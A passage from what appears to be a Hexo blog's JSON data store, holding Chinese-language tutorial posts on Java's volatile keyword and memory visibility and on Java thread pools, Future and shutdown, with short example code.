class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\">a++;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> b = <span class=\"number\">2</span>;</span><br><span class=\"line\">b++;</span><br></pre></td></tr></table></figure></p>\n<p>但对于<code>volatitle</code>变量来说，指令重排是一个挑战，让我们来看一下上述MyClass的例子<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyClass</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> years;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> months</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">volatile</span> <span class=\"keyword\">int</span> days;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">update</span><span class=\"params\">(<span class=\"keyword\">int</span> years, <span class=\"keyword\">int</span> months, <span class=\"keyword\">int</span> days)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.years  = years;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.months = months;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.days   = days;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>当写入<code>days</code>时，也会同时写入<code>years</code>和<code>months</code>到主存。但是如果Java VM重排指令如下：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">update</span><span class=\"params\">(<span class=\"keyword\">int</span> years, <span class=\"keyword\">int</span> months, <span class=\"keyword\">int</span> days)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.days   = days;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.months = months;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.years  = years;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>当<code>days</code>修改时，<code>months</code>和<code>years</code>也会写入主存，但是这次<code>days</code>写入发生在<code>years</code>和<code>months</code>之前，因此这个新值对其他线程不可见，这个语义含义已经被改变了。</p>\n<blockquote>\n<p>特别注意，在写入时，把<code>volatitle</code>变量写入放在最后，这样当运行到<code>volatitle</code>变量写入时，会同时把其他非<code>volatitle</code>写入主存，但当<code>volatitle</code>写在最开始时，后面的非<code>volatitle</code>便不会写入最新值。读取相反，将<code>volatitle</code>读取放在最前，线程会读取所有值最新的主存值，如果放在最后面，那么前面读取的变量不是从主存直接读取的。</p>\n</blockquote>\n<h2 id=\"Happens-Before\"><a href=\"#Happens-Before\" class=\"headerlink\" title=\"Happens-Before\"></a>Happens-Before</h2><p>为了解决指令重组问题，Java <code>volatitle</code>关键字除了可见性保证，还给了一个<code>happens-before</code>保证，<code>happens-before</code>保证如下：</p>\n<ul>\n<li>如果读写发生在写入<code>volatitle</code>变量之前，那么读写其他变量的指令不能被重组到写入<code>volatitle</code>变量之后。写入<code>volatitle</code>变量之前的读写被保证<code>happens before</code>写<code>volatitle</code>变量。需要注意，写入<code>volatitle</code>变量之后的读写其他变量仍然有可能被重组到写入<code>volatitle</code>变量之前。因此<strong>From after to before is allowed, but from before to after is not allowed</strong>（<code>volatitle</code>写操作之后的指令被重组到写之前是允许的，而写操作之前的指令不允许被重组到写之后）</li>\n<li>读<code>volatitle</code>变量之后的读写操作不能被重组到<code>volatitle</code>之前，但同样注意发生在读<code>volatitle</code>之前的指令可以重组到读<code>volatitle</code>之后。因此<strong>From before to after is allowed, but from after to before is not allowed</strong>(<code>volatitle</code>读之前的指令被重组到读之后值允许的，而读操作之后的指令不允许被重组到读值前)</li>\n</ul>\n<blockquote>\n<p>Reads from and writes to other variables cannot be reordered to occur after a write to a volatile variable, if the reads / writes originally occurred before the write to the volatile variable.<br>The reads / writes before a write to a volatile variable are guaranteed to “happen before” the write to the volatile variable. Notice that it is still possible for e.g. reads / writes of other variables located after a write to a volatile to be reordered to occur before that write to the volatile. Just not the other way around. From after to before is allowed, but from before to after is not allowed</p>\n<p>Reads from and writes to other variables cannot be reordered to occur before a read of a volatile variable, if the reads / writes originally occurred after the read of the volatile variable. Notice that it is possible for reads of other variables that occur before the read of a volatile variable can be reordered to occur after the read of the volatile. Just not the other way around. From before to after is allowed, but from after to before is not allowed</p>\n</blockquote>\n<p>重点解释一下这两个保证：<br>对于<code>volatitle</code>写来说，如果写之前的指令被重组到写之后，那么当执行到<code>volatitle</code>时，最新值就不能被立刻写入主存；但写之后的指令被重组到写之前是没有影响的，因为写之后的指令最终还是要被写到主存，只是重组之后提前将新值写入主存。<br>对于<code>volatitle</code>读来说，如果读之后的指令被重组到读之前，那么指令没有获取最新值，因为只有到<code>volatitle</code>读执行时才重读所有变量的主存值，比如当<code>years</code>读取发生<code>volatitle days</code>之后，那么执行到<code>volatitle days</code>会刷新<code>years</code>的值，但<code>years</code>被重组到<code>volatitle days</code>之前，<code>years</code>的值没有刷新；相反，如果读取<code>years</code>在<code>volatitle days</code>之前，被重组到之后，它会读到最新值，这正是我们希望的结果。</p>\n<h2 id=\"volatile-is-Not-Always-Enough\"><a href=\"#volatile-is-Not-Always-Enough\" class=\"headerlink\" title=\"volatile is Not Always Enough\"></a>volatile is Not Always Enough</h2><p>当多个线程都需要对一个<code>volatitle</code>变量进行写入，且写入之前需要依赖<code>volatitle</code>之前的值，这时候就会出现竞争条件：</p>\n<p>想象一下，如果线程1读取一个<code>shared  counter</code>值到自己CPU Cache中，开始值为0，然后<code>increment</code>该值为1，但没有把改变的值写入主存；然后线程2也从主存中读取<code>counter</code>，由于线程1没有将改变的值写入主存，此时线程2读到的值为0，它也对值进行<code>increment</code>后值变为1，此时线程2也没有将值写入主存，就像这样:<br><img src=\"http://tutorials.jenkov.com/images/java-concurrency/java-volatile-3.png\" alt=\"\"></p>\n<p>线程1和线程2几乎不同步，而我们希望的是进行两次加操作后值为2，但线程1和线程2的CPU Cache中<code>counter</code>都是1，即使我们将它们的值写入到主存，结果仍然不对，这都是<strong>volatile is Not Always Enough</strong></p>\n<h2 id=\"When-is-volatile-Enough\"><a href=\"#When-is-volatile-Enough\" class=\"headerlink\" title=\"When is volatile Enough?\"></a>When is volatile Enough?</h2><p>既然出现了上诉情况，那么如果解决这个问题？之前<code>volatitle</code>已经明显不够，那么这时候可以使用Java另外一个关键字<code>synchronized</code>去保证读取变量和写入变量是原子性的操作。上诉的<code>volatitle</code>读写操作并不会产生线程阻塞，使用<code>synchronized</code>保证临界区读写不出现上述问题，但这样会导致线程阻塞。另外也可以使用<code>java.util.concurrent package</code>里面的<code>AtomicLong</code> or <code>AtomicReference</code>或者其他。</p>\n<p>在这样的情况下，只有一个线程允许对<code>volatitle</code>变量进行读写操作，其他线程只允许读取，这样即保证读取最新的值，也保证直接写入主存。但是光有<code>synchronized</code>并不能保证可见性。</p>\n<h2 id=\"性能问题\"><a href=\"#性能问题\" class=\"headerlink\" title=\"性能问题\"></a>性能问题</h2><p>之前已经说过，<code>volatitle</code>的读写都要直接接触主存，那么与读写CPU Cache相比，开销增大许多倍，放一张计算机各级缓存以及主存的读取速度比较:<br><img src=\"http://www.qdpma.com/SystemArchitecture_files/CPU_4c.png\" alt=\"\"></p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"http://tutorials.jenkov.com/java-concurrency/volatile.html\">Java Volatile Keyword</a></li>\n</ul>"},{"title":"Java 线程池","date":"2018-03-17T07:18:23.000Z","_content":"\n## 概念\n`Java Thread pool` represents a group of worker threads that are waiting for the job and reuse many times.\nJava中创建一个线程是一个相对耗时的操作，当程序中频繁的创建和使用线程时，会产生严重的内存管理开销(significant memory management overhead)。基于这个原因，Java有了线程池的概念，在使用线程之前，创建一个线程池。当一个任务需要一个线程去运行时，程序去线程池中选择一个空闲线程去运行。当任务结束后，线程又重新放进线程池中等待下一个任务，这样就避免了频繁的创建线程，大大节省了内存管理开销。\n\n## 线程池分类\n`fixed thread pool` : 固型线程池----创建时指定创建的线程数，当任务使用完线程池中的空闲线程，则新任务将等待被占用的线程执行完任务。\n\n固定长度线程池的优点 : 用Web服务器举例说明，Web服务器需要单独的线程去处理一个HTTP请求，当出现大量的HTTP请求，超过了系统能够承受的范围，那么这个Web服务器就会停止响应所有的请求。而如果使用固定长度线程池，虽然不能立刻服务请求，但系统会尽最大能力去处理。\n\n<!-- more -->\n\n``` java\nclass WorkerThread implements Runnable {\n    private String message;\n    public WorkerThread(String s){\n        this.message=s;\n    }\n    public void run() {\n        System.out.println(Thread.currentThread().getName()+\" (Start) message = \"+message);\n        processmessage();//call processmessage method that sleeps the thread for 2 seconds\n        System.out.println(Thread.currentThread().getName()+\" (End)\");//prints thread name\n    }\n    private void processmessage() {\n        try {  Thread.sleep(2000);  } catch (InterruptedException e) { e.printStackTrace(); }\n    }\n}\n\npublic class TestThreadPool {\n    public static void main(String[] args) {\n        ExecutorService executor = Executors.newFixedThreadPool(5);//creating a pool of 5 threads\n        for (int i = 0; i < 10; i++) {\n            Runnable worker = new WorkerThread(\"\" + i);\n            executor.execute(worker);//calling execute method of ExecutorService\n        }\n        executor.shutdown();\n        while (!executor.isTerminated()) {   }\n\n        System.out.println(\"Finished all threads\");\n    }\n}\n```\n\n`CachedThreadPool` : 缓存线程池，这样的线程池适合于有许多`short-lived`任务的程序。任务执行前先查看线程池中是否有当前执行线程的缓存，如果有就resue(复用),如果没有,那么需要创建一个线程来完成当前的调用。并且这类线程池内部规定能resue(复用)的线程，空闲的时间不能超过60s,一旦超过了60s,就会被移出线程池。\n`SingleThreadExecutor` : 单例执行器，这样的`exector`保证了一个时刻只有一个线程执行。\n`ScheduledThreadPool` : 调度型线程池，调度型线程池会根据Scheduled(任务列表)进行延迟执行，或者是进行周期性的执行.适用于一些周期性的工作。\n\n## 创建线程池\n- 创建固定型线程\n``` java\nExecutorService service3 = Executors.newFixedThreadPool(10);\n```\n- 创建缓存型线程池\n``` java\nExecutorService service2 = Executors.newCacheThreadPool();\n```\n- 创建调度型线程池\n``` java\nExecutorService service4 = Executors.newScheduledThreadPool(10);\n```\n\n## Future 介绍\nFuture表示异步计算的结果，它提供了检查计算是否完成的方法，以等待计算的完成，并检索计算的结果。Future的cancel方法可以取消任务的执行，它有一布尔参数，参数为 true 表示立即中断任务的执行，参数为 false 表示允许正在运行的任务运行完成。Future的 get 方法等待计算完成，获取计算结果。\n``` java\npackage com.reapal.brave.main;\n\nimport java.util.concurrent.Callable;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.Future;\n\npublic class CallableAndFuture {\n\n    public static class  MyCallable  implements Callable{\n        private int flag = 0;\n        public MyCallable(int flag){\n            this.flag = flag;\n        }\n        public String call() throws Exception{\n            if (this.flag == 0){\n                return \"flag = 0\";\n            }\n            if (this.flag == 1){\n                try {\n                    while (true) {\n                        System.out.println(\"looping.\");\n                        Thread.sleep(2000);\n                    }\n                } catch (InterruptedException e) {\n                    System.out.println(\"Interrupted\");\n                }\n                return \"false\";\n            } else {\n                throw new Exception(\"Bad flag value!\");\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        MyCallable task1 = new MyCallable(0);\n        MyCallable task2 = new MyCallable(1);\n        MyCallable task3 = new MyCallable(2);\n        ExecutorService es = Executors.newFixedThreadPool(3);\n        try {\n            // 提交并执行任务，任务启动时返回了一个Future对象，\n            // 如果想得到任务执行的结果或者是异常可对这个Future对象进行操作\n            Future future1 = es.submit(task1);\n            // 获得第一个任务的结果，如果调用get方法，当前线程会等待任务执行完毕后才往下执行\n            System.out.println(\"task1: \" + future1.get());\n            Future future2 = es.submit(task2);\n            // 等待5秒后，再停止第二个任务。因为第二个任务进行的是无限循环\n            Thread.sleep(5000);\n            System.out.println(\"task2 cancel: \" + future2.cancel(true));\n            // 获取第三个任务的输出，因为执行第三个任务会引起异常\n            // 所以下面的语句将引起异常的抛出\n            Future future3 = es.submit(task3);\n            System.out.println(\"task3: \" + future3.get());\n        } catch (Exception e){\n            System.out.println(e.toString());\n        }\n        // 停止任务执行服务\n        es.shutdownNow();\n    }\n}\n```\n\n## execute与submit区别\n- 接收的参数不一样\n- submit有返回值，而execute没有\n- submit方便Exception处理\n- execute是Executor接口中唯一定义的方法；submit是ExecutorService（该接口继承Executor）中定义的方法\n\n## 关闭线程池\n- `shutdown()` : 不会立刻停止，只是表示停止接收任务，而等待线程池中正在执行的线程结束后，才关闭线程池\n- `shutdownNow()` : 立刻关闭线程池，包括不接受任务，线程池中正在执行的任务也立刻停止。\n\n## 参考链接\n- [https://www.jianshu.com/p/edd7cb4eafa0](https://www.jianshu.com/p/edd7cb4eafa0)\n- [https://docs.oracle.com/javase/tutorial/essential/concurrency/pools.html](https://docs.oracle.com/javase/tutorial/essential/concurrency/pools.html)\n","source":"_posts/Java线程池.md","raw":"---\ntitle: Java 线程池\ndate: 2018-03-17 15:18:23\ncategories: Java\ntags:\n  - Thread\n  - 线程池\n---\n\n## 概念\n`Java Thread pool` represents a group of worker threads that are waiting for the job and reuse many times.\nJava中创建一个线程是一个相对耗时的操作，当程序中频繁的创建和使用线程时，会产生严重的内存管理开销(significant memory management overhead)。基于这个原因，Java有了线程池的概念，在使用线程之前，创建一个线程池。当一个任务需要一个线程去运行时，程序去线程池中选择一个空闲线程去运行。当任务结束后，线程又重新放进线程池中等待下一个任务，这样就避免了频繁的创建线程，大大节省了内存管理开销。\n\n## 线程池分类\n`fixed thread pool` : 固型线程池----创建时指定创建的线程数，当任务使用完线程池中的空闲线程，则新任务将等待被占用的线程执行完任务。\n\n固定长度线程池的优点 : 用Web服务器举例说明，Web服务器需要单独的线程去处理一个HTTP请求，当出现大量的HTTP请求，超过了系统能够承受的范围，那么这个Web服务器就会停止响应所有的请求。而如果使用固定长度线程池，虽然不能立刻服务请求，但系统会尽最大能力去处理。\n\n<!-- more -->\n\n``` java\nclass WorkerThread implements Runnable {\n    private String message;\n    public WorkerThread(String s){\n        this.message=s;\n    }\n    public void run() {\n        System.out.println(Thread.currentThread().getName()+\" (Start) message = \"+message);\n        processmessage();//call processmessage method that sleeps the thread for 2 seconds\n        System.out.println(Thread.currentThread().getName()+\" (End)\");//prints thread name\n    }\n    private void processmessage() {\n        try {  Thread.sleep(2000);  } catch (InterruptedException e) { e.printStackTrace(); }\n    }\n}\n\npublic class TestThreadPool {\n    public static void main(String[] args) {\n        ExecutorService executor = Executors.newFixedThreadPool(5);//creating a pool of 5 threads\n        for (int i = 0; i < 10; i++) {\n            Runnable worker = new WorkerThread(\"\" + i);\n            executor.execute(worker);//calling execute method of ExecutorService\n        }\n        executor.shutdown();\n        while (!executor.isTerminated()) {   }\n\n        System.out.println(\"Finished all threads\");\n    }\n}\n```\n\n`CachedThreadPool` : 缓存线程池，这样的线程池适合于有许多`short-lived`任务的程序。任务执行前先查看线程池中是否有当前执行线程的缓存，如果有就resue(复用),如果没有,那么需要创建一个线程来完成当前的调用。并且这类线程池内部规定能resue(复用)的线程，空闲的时间不能超过60s,一旦超过了60s,就会被移出线程池。\n`SingleThreadExecutor` : 单例执行器，这样的`exector`保证了一个时刻只有一个线程执行。\n`ScheduledThreadPool` : 调度型线程池，调度型线程池会根据Scheduled(任务列表)进行延迟执行，或者是进行周期性的执行.适用于一些周期性的工作。\n\n## 创建线程池\n- 创建固定型线程\n``` java\nExecutorService service3 = Executors.newFixedThreadPool(10);\n```\n- 创建缓存型线程池\n``` java\nExecutorService service2 = Executors.newCacheThreadPool();\n```\n- 创建调度型线程池\n``` java\nExecutorService service4 = Executors.newScheduledThreadPool(10);\n```\n\n## Future 介绍\nFuture表示异步计算的结果，它提供了检查计算是否完成的方法，以等待计算的完成，并检索计算的结果。Future的cancel方法可以取消任务的执行，它有一布尔参数，参数为 true 表示立即中断任务的执行，参数为 false 表示允许正在运行的任务运行完成。Future的 get 方法等待计算完成，获取计算结果。\n``` java\npackage com.reapal.brave.main;\n\nimport java.util.concurrent.Callable;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.Future;\n\npublic class CallableAndFuture {\n\n    public static class  MyCallable  implements Callable{\n        private int flag = 0;\n        public MyCallable(int flag){\n            this.flag = flag;\n        }\n        public String call() throws Exception{\n            if (this.flag == 0){\n                return \"flag = 0\";\n            }\n            if (this.flag == 1){\n                try {\n                    while (true) {\n                        System.out.println(\"looping.\");\n                        Thread.sleep(2000);\n                    }\n                } catch (InterruptedException e) {\n                    System.out.println(\"Interrupted\");\n                }\n                return \"false\";\n            } else {\n                throw new Exception(\"Bad flag value!\");\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        MyCallable task1 = new MyCallable(0);\n        MyCallable task2 = new MyCallable(1);\n        MyCallable task3 = new MyCallable(2);\n        ExecutorService es = Executors.newFixedThreadPool(3);\n        try {\n            // 提交并执行任务，任务启动时返回了一个Future对象，\n            // 如果想得到任务执行的结果或者是异常可对这个Future对象进行操作\n            Future future1 = es.submit(task1);\n            // 获得第一个任务的结果，如果调用get方法，当前线程会等待任务执行完毕后才往下执行\n            System.out.println(\"task1: \" + future1.get());\n            Future future2 = es.submit(task2);\n            // 等待5秒后，再停止第二个任务。因为第二个任务进行的是无限循环\n            Thread.sleep(5000);\n            System.out.println(\"task2 cancel: \" + future2.cancel(true));\n            // 获取第三个任务的输出，因为执行第三个任务会引起异常\n            // 所以下面的语句将引起异常的抛出\n            Future future3 = es.submit(task3);\n            System.out.println(\"task3: \" + future3.get());\n        } catch (Exception e){\n            System.out.println(e.toString());\n        }\n        // 停止任务执行服务\n        es.shutdownNow();\n    }\n}\n```\n\n## execute与submit区别\n- 接收的参数不一样\n- submit有返回值，而execute没有\n- submit方便Exception处理\n- execute是Executor接口中唯一定义的方法；submit是ExecutorService（该接口继承Executor）中定义的方法\n\n## 关闭线程池\n- `shutdown()` : 不会立刻停止，只是表示停止接收任务，而等待线程池中正在执行的线程结束后，才关闭线程池\n- `shutdownNow()` : 立刻关闭线程池，包括不接受任务，线程池中正在执行的任务也立刻停止。\n\n## 参考链接\n- [https://www.jianshu.com/p/edd7cb4eafa0](https://www.jianshu.com/p/edd7cb4eafa0)\n- [https://docs.oracle.com/javase/tutorial/essential/concurrency/pools.html](https://docs.oracle.com/javase/tutorial/essential/concurrency/pools.html)\n","slug":"Java线程池","published":1,"updated":"2018-03-17T11:19:32.042Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscxe000hyp0lkt1opimv","content":"<h2 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h2><p><code>Java Thread pool</code> represents a group of worker threads that are waiting for the job and reuse many times.<br>Java中创建一个线程是一个相对耗时的操作，当程序中频繁的创建和使用线程时，会产生严重的内存管理开销(significant memory management overhead)。基于这个原因，Java有了线程池的概念，在使用线程之前，创建一个线程池。当一个任务需要一个线程去运行时，程序去线程池中选择一个空闲线程去运行。当任务结束后，线程又重新放进线程池中等待下一个任务，这样就避免了频繁的创建线程，大大节省了内存管理开销。</p>\n<h2 id=\"线程池分类\"><a href=\"#线程池分类\" class=\"headerlink\" title=\"线程池分类\"></a>线程池分类</h2><p><code>fixed thread pool</code> : 固型线程池—-创建时指定创建的线程数，当任务使用完线程池中的空闲线程，则新任务将等待被占用的线程执行完任务。</p>\n<p>固定长度线程池的优点 : 用Web服务器举例说明，Web服务器需要单独的线程去处理一个HTTP请求，当出现大量的HTTP请求，超过了系统能够承受的范围，那么这个Web服务器就会停止响应所有的请求。而如果使用固定长度线程池，虽然不能立刻服务请求，但系统会尽最大能力去处理。</p>\n<a id=\"more\"></a>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">WorkerThread</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String message;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">WorkerThread</span><span class=\"params\">(String s)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.message=s;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(Thread.currentThread().getName()+<span class=\"string\">\" (Start) message = \"</span>+message);</span><br><span class=\"line\">        processmessage();<span class=\"comment\">//call processmessage method that sleeps the thread for 2 seconds</span></span><br><span class=\"line\">        System.out.println(Thread.currentThread().getName()+<span class=\"string\">\" (End)\"</span>);<span class=\"comment\">//prints thread name</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">processmessage</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;  Thread.sleep(<span class=\"number\">2000</span>);  &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123; e.printStackTrace(); &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestThreadPool</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        ExecutorService executor = Executors.newFixedThreadPool(<span class=\"number\">5</span>);<span class=\"comment\">//creating a pool of 5 threads</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">            Runnable worker = <span class=\"keyword\">new</span> WorkerThread(<span class=\"string\">\"\"</span> + i);</span><br><span class=\"line\">            executor.execute(worker);<span class=\"comment\">//calling execute method of ExecutorService</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        executor.shutdown();</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (!executor.isTerminated()) &#123;   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Finished all threads\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>CachedThreadPool</code> : 缓存线程池，这样的线程池适合于有许多<code>short-lived</code>任务的程序。任务执行前先查看线程池中是否有当前执行线程的缓存，如果有就resue(复用),如果没有,那么需要创建一个线程来完成当前的调用。并且这类线程池内部规定能resue(复用)的线程，空闲的时间不能超过60s,一旦超过了60s,就会被移出线程池。<br><code>SingleThreadExecutor</code> : 单例执行器，这样的<code>exector</code>保证了一个时刻只有一个线程执行。<br><code>ScheduledThreadPool</code> : 调度型线程池，调度型线程池会根据Scheduled(任务列表)进行延迟执行，或者是进行周期性的执行.适用于一些周期性的工作。</p>\n<h2 id=\"创建线程池\"><a href=\"#创建线程池\" class=\"headerlink\" title=\"创建线程池\"></a>创建线程池</h2><ul>\n<li><p>创建固定型线程</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ExecutorService service3 = Executors.newFixedThreadPool(<span class=\"number\">10</span>);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>创建缓存型线程池</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ExecutorService service2 = Executors.newCacheThreadPool();</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>创建调度型线程池</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ExecutorService service4 = Executors.newScheduledThreadPool(<span class=\"number\">10</span>);</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"Future-介绍\"><a href=\"#Future-介绍\" class=\"headerlink\" title=\"Future 介绍\"></a>Future 介绍</h2><p>Future表示异步计算的结果，它提供了检查计算是否完成的方法，以等待计算的完成，并检索计算的结果。Future的cancel方法可以取消任务的执行，它有一布尔参数，参数为 true 表示立即中断任务的执行，参数为 false 表示允许正在运行的任务运行完成。Future的 get 方法等待计算完成，获取计算结果。<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.reapal.brave.main;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.Callable;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.ExecutorService;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.Executors;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.Future;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CallableAndFuture</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span>  <span class=\"title\">MyCallable</span>  <span class=\"keyword\">implements</span> <span class=\"title\">Callable</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MyCallable</span><span class=\"params\">(<span class=\"keyword\">int</span> flag)</span></span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.flag = flag;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">call</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.flag == <span class=\"number\">0</span>)&#123;</span><br><span 